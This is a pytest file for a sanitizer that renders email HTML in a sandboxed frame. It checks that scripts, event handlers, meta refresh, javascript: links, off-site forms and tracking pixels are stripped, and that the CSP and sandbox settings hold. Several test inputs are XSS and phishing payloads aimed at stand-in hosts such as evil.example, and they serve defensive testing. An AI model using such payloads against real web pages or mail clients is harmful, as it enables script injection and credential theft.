"""Un mail tel qu'il a été écrit, dans son cadre isolé (ADR 0169) : ses styles restent, rien n'y agit ; ses
images intégrées s'y montrent (ADR 0172)."""

from html.parser import HTMLParser

import pytest

from mika.inspector.framed import FRAME_CSP, SANDBOX, Documents, framed_html


class Tags(HTMLParser):
    def __init__(self, text):
        super().__init__()
        self.tags = []
        self.styles = []
        self._style = False
        self.feed(text)

    def handle_starttag(self, tag, attrs):
        self.tags.append((tag, dict(attrs)))
        self._style = tag == "style"

    def handle_data(self, data):
        if self._style:
            self.styles.append(data)

    def handle_endtag(self, tag):
        self._style = False


@pytest.mark.parametrize("source", [
    '<script>parent.document.body.innerHTML="x"</script><p onclick="run()" onmouseover=run()>Bonjour</p>',
    '<meta http-equiv="refresh" content="0;url=https://evil.example"><base href="https://evil.example" target="_top">'
    '<link rel="stylesheet" href="https://evil.example/s.css"><p>Bonjour</p>',
    '<iframe src="https://evil.example"></iframe><object data="https://evil.example"></object><embed src="x"><p>Bonjour</p>',
    '<svg><a xlink:href="javascript:run()">x</a><script>run()</script></svg><math><mi>x</mi></math><p>Bonjour</p>',
    '<a href="javascript:run()" target="_top">Bonjour</a><a href="data:text/html,x">x</a><a href="//evil.example">x</a>',
    '<form action="https://evil.example/login"><input name="password"><button formaction="https://evil.example">Bonjour'
    '</button></form>',
    '<table background="https://tracker.example/bg.gif"><tr><td><img src="https://tracker.example/p.gif" '
    'srcset="https://tracker.example/2x.gif 2x" alt="Bonjour"></td></tr></table>',
    '<p "onclick=run() a<b=1>Bonjour</p><noscript><img src="https://tracker.example/ns.gif"></noscript>',
    '<style>p{color:red}</style ><script>run()</script><p>Bonjour</p>',
])
def test_the_frame_runs_nothing_loads_nothing_and_cannot_leave(source):
    result = framed_html(source)
    parsed = Tags(result)
    names = {t for t, _ in parsed.tags}
    assert not names & {"script", "iframe", "object", "embed", "svg", "math", "base", "link", "noscript"}
    assert [a for t, a in parsed.tags if t == "meta"] == [{"charset": "utf-8"}]  # le nôtre, aucun autre
    for tag, attrs in parsed.tags:
        assert not any(n.startswith("on") for n in attrs), (tag, attrs)
        assert not set(attrs) & {"action", "formaction", "srcset", "background", "xlink:href", "http-equiv"}
        assert attrs.get("href", "https:").startswith(("https:", "http:", "mailto:")), attrs
        assert "src" not in attrs, attrs  # aucune image distante
        if "href" in attrs:
            assert attrs["target"] == "_blank" and attrs["rel"] == "noopener noreferrer nofollow"
    assert "run()" not in result and "evil.example" not in result and "tracker.example" not in result
    assert "Bonjour" in result


def test_the_frame_keeps_the_mail_styles_and_layout():
    source = ('<html lang="fr"><head><style>@media (max-width: 640px) { .wrap > td { display: block !important; } }'
              '</style></head><body style="margin:0; background-color:#f4f6f9;" bgcolor="#f4f6f9">'
              '<table class="wrap" width="700" cellpadding="0" style="background:#fff"><tr>'
              '<td width="18" valign="top" style="color:#27ae60">✓</td><td colspan="2">Gestion &amp; supervision</td>'
              '</tr></table><a href="mailto:contact@example.test?subject=D%C3%A9mo" style="display:inline-block">'
              'Demander une présentation</a></body></html>')
    result = framed_html(source)
    parsed = Tags(result)
    assert ".wrap > td { display: block !important; }" in "".join(parsed.styles)  # sa feuille, telle quelle
    assert ("body", {"style": "margin:0; background-color:#f4f6f9;", "bgcolor": "#f4f6f9"}) in parsed.tags
    assert ("table", {"class": "wrap", "width": "700", "cellpadding": "0", "style": "background:#fff"}) in parsed.tags
    assert ("td", {"width": "18", "valign": "top", "style": "color:#27ae60"}) in parsed.tags
    assert "Gestion &amp; supervision" in result
    assert ("a", {"href": "mailto:contact@example.test?subject=D%C3%A9mo", "style": "display:inline-block",
                  "target": "_blank", "rel": "noopener noreferrer nofollow"}) in parsed.tags
    assert result.startswith('<!doctype html><meta charset="utf-8"><style>')  # sa page blanche, que le mail recouvre


def test_a_blocked_image_leaves_its_alt_text_at_its_size_and_inline_images_stay():
    pixel = "data:image/png;base64,iVBORw0KGgo="
    result = framed_html('<img src="https://example.test/logo.png" width="82" height="82" alt="Brain Networks" '
                         'class="logo" style="display:block; border:0">'
                         '<img src="https://tracker.example/p.gif" width="1" height="1">'
                         f'<img src="{pixel}" alt="Signature">')
    assert ('<span class="logo" style="display:inline-block;overflow:hidden;width:82px;height:82px;'
            'display:block; border:0">Brain Networks</span>') in result
    assert "tracker.example" not in result and result.count("<img") == 1
    assert f'<img src="{pixel}" alt="Signature">' in result


def test_the_frame_policy_and_sandbox_forbid_scripts_and_outside_content():
    assert "allow-scripts" not in SANDBOX and "allow-forms" not in SANDBOX and "allow-top-navigation" not in SANDBOX
    policy = dict(part.strip().split(" ", 1) for part in FRAME_CSP.split(";"))
    assert policy["default-src"] == "'none'" and "script-src" not in policy  # default-src 'none' : aucun script
    assert policy["img-src"] == "data:" and policy["style-src"] == "'unsafe-inline'"
    assert policy["form-action"] == "'none'" and policy["frame-ancestors"] == "'self'"
    assert policy["sandbox"] == SANDBOX


def test_documents_wait_by_digest_and_only_the_latest_are_kept():
    documents = Documents(size=2)
    first = documents.keep("<p>un</p>")
    assert documents.keep("<p>un</p>") == first and len(first) == 40
    second, third = documents.keep("<p>deux</p>"), documents.keep("<p>trois</p>")
    assert documents.get(first) is None and documents.get(second).html == "<p>deux</p>"
    assert documents.get(third).html == "<p>trois</p>" and documents.get("inconnu") is None


def test_inline_images_take_their_place_as_data_and_nothing_else_does():
    """ADR 0172 : une image ``cid:`` arrive avec le document ; le cadre ne charge toujours rien du dehors."""
    logo = ("<Logo.1@Exemple.fr>", "image/PNG", b"\x89PNG-logo")
    hostile = ("svg@x", "image/svg+xml", b"<svg onload='run()'/>")
    result = framed_html('<img src="cid:logo.1%40exemple.fr" alt="Logo" width="82"><img src="CID:svg@x" alt="Dessin">'
                         '<img src="cid:inconnu@x" alt="Absent"><img src="cid:logo.1@exemple.fr" '
                         'srcset="https://tracker.example/2x.png 2x">', (logo, hostile))
    parsed = Tags(result)
    sources = [a.get("src") for t, a in parsed.tags if t == "img"]
    assert sources == ["data:image/png;base64,iVBORy1sb2dv"] * 2  # encodé, casse ignorée ; le même logo deux fois
    assert "svg" not in result and "run()" not in result and "tracker.example" not in result
    assert ">Dessin</span>" in result and ">Absent</span>" in result  # sans image sûre : son texte


def test_documents_keep_their_images_within_a_budget_and_change_digest_with_them():
    documents = Documents(budget=1000)
    plain = documents.keep("<p>un</p>")
    with_logo = documents.keep("<p>un</p>", (("a@x", "image/png", b"x" * 600),))
    assert with_logo != plain and documents.get(with_logo).images[0][2] == b"x" * 600
    heavy = documents.keep("<p>deux</p>", (("b@x", "image/png", b"y" * 600),))
    assert documents.get(with_logo) is None and documents.get(heavy) is not None  # le plus ancien cède
    alone = documents.keep("<p>trois</p>", (("c@x", "image/png", b"z" * 5000),))
    assert documents.get(alone) is not None  # même au-delà du budget, le dernier venu reste
